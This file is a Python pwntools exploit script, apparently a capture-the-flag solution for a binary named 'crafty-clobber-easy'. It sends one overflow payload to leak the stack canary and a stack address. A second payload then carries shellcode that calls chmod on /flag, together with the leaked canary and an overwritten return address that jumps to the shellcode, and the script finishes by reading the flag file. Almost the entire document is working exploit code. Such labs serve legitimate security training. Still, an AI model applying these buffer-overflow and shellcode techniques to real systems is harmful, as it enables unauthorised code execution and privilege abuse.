#!/usr/bin/python3

from pwn import *
import re
import os

context.arch = "amd64"

context.log_level = "error"

elf = context.binary = ELF("./crafty-clobber-easy")

rbp = 0x7ffed08eaf40

input_start = rbp - 0x60
input_end = input_start + (0xb * 8) - 8 # i subtract 8 because that 8 byte is for condition value  at rbp - 0x10
condition_value = 0x7adaa12e5a2e0777
canary_add = rbp - 8
ret_add = rbp + 8

def get_shellcode():
    shellcode = asm("""
        xor eax, eax
        mov al, 90
        lea rdi, [rip+filename]
        xor esi, esi
        mov si, 511
        syscall

        filename:
		.string "/flag"
    """)
#    print(disasm(shellcode))
    return shellcode

def get_add(data,length):
    regex = rb"You said: [\x00-\xff]{20,150}\n"
    match = re.findall(regex,data)[0][length + 10:]
    canary = int.from_bytes(match[:7].rjust(8,b"\x00"),"little")
    stack = int.from_bytes(match[7:][:-1].ljust(8,b"\x00"),"little")
    return canary,stack

def recvuntil_size(io):
    data = io.recvuntil(b"Payload size:")
    return io,data

def recvuntil_send(io):
    data = io.recvuntil(b"Send your payload (up to")
    return io,data

def recv_remaining(io):
    data = io.recvall()
    return io,data

io = process()
payload = b"REPEAT" + cyclic(canary_add - input_start + 1 - len("REPEAT"))

io , data = recvuntil_size(io)
#print(data.decode())
io.sendline(str(len(payload)).encode())

io , data = recvuntil_send(io)
io.sendline(payload)

io , data = recvuntil_size(io)
#print(data.decode('latin-1'))
canary , stack = get_add(data,len(payload))

print(hex(canary),hex(stack))

shellcode = get_shellcode()
payload2 = shellcode + cyclic(canary_add - input_start - len(shellcode) - 8) + p64(condition_value) + p64(canary) + cyclic(8) + p64(stack - 0x10a0 - 0xa0 - 16)
print(len(payload2),len(shellcode))

io.sendline(str(len(payload2)).encode())
io , data = recvuntil_send(io)

io.sendline(payload2)

io , data = recv_remaining(io)
print(data.decode('latin-1'))
print("\033[38;5;80mThe permission of /flag is changed into  -rwxrwxrwx . So you can read flag")

print("\033[38;5;214mYour flag: ")
os.system("cat /flag")
